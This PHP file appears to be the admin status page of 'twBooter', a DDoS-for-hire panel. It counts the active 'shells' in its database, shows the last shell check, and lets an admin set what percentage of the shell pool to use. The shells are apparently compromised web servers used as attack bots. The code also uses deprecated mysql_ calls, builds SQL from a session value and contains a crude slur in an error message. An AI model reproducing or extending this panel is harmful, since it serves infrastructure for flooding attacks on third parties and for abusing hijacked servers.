<?php
		//Start session
	session_start();
	//Check whether the session variable
	//SESS_MEMBER_ID is present or not
	include('includes/db.php');
	if(!isset($_SESSION['SESS_MEMBER_ID']) || (trim($_SESSION['SESS_MEMBER_ID'])=='')) {
		header("location: index.php");
		exit();
}

$query = "SELECT * FROM users WHERE id={$_SESSION['SESS_MEMBER_ID']}";
$result = mysql_query($query);
$row = mysql_fetch_array($result, MYSQL_ASSOC);

$staff = $row['staff'];

if ($staff !== 'admin') {
exit();
}
	
include("_top.php");
include_once('includes/db.php');

$result = mysql_query("SELECT * FROM shells WHERE status='up'"); // Query the database and get the count
$shellcount = mysql_num_rows($result);

$query=mysql_query("SELECT * FROM stats");
$row=mysql_fetch_array($query, MYSQL_ASSOC);
$wver = $row['wver'];
$percentage = $row['percentage'];
$lastcheck = $row['lastshell'];
	
if ($staff == 'admin'){

	if (isset($_POST['Submit'])) {
		if ((!empty($_POST['percentage'])) AND (is_numeric($_POST['percentage']))) {
				$_POST['percentage'] = round($_POST['percentage']);
				if (($_POST['percentage'] > '100') or ($_POST['percentage'] < '1')) {
						$npercentage = '30';
				} else {
						$npercentage = $_POST['percentage'];
				}
				mysql_query("UPDATE stats SET percentage='" . $npercentage . "' WHERE id='1'") or die("MYSQL is indeed gay: ".mysql_error());
		}
				echo 'Status updated'; 
	} //If Submit
} //if user is admin

			
?>
<title>twBooter - Entry</title>

<form name="frmcontadd" action="" method="post">
<table width="60%" align="center" class="table">
  <tr>
    <td colspan="2" align="center" class="head" valign="middle"><strong>Status</strong></td>
  </tr>
  <tr>
    <td colspan="1" class="cell" align="right" valign="middle"><strong>Shell Count:</strong></td>
	<td colspan="1" class="cell" align="left" valign="middle"><strong><?php echo $shellcount; ?></strong></td>
  </tr>
  <tr>
    <td colspan="1" class="cell" align="right" valign="middle"><strong>Last Shell Check:</strong></td>
    <td colspan="1" class="cell" align="left" valign="middle"><strong><?php echo date('d M Y H:i:s', $lastcheck); ?></strong></td>
  </tr> 
  <tr>
    <td width="23%" class="cell" align="right" valign="middle"><strong>Version:</strong></td>
	<td width="35%" class="cell" valign="middle" align="center"><? echo $wver; ?>
  </tr>
  <tr>
    <td width="23%" class="cell" align="right" valign="middle"><strong>Shell Use Percentage:</strong></td>
	<td width="35%" class="cell" valign="middle" align="center"><input size="42" class="entryfield" value="<? echo $percentage; ?>" name="percentage" type="text" id="percentage"></td>	
  </tr>
  <tr>
    <td colspan="2" class="sub" align="right" valign="middle"><input type="submit" class="button" name="Submit" value="Update"></td>
  </tr>
</table></form>

<p><br>
  
  </p>
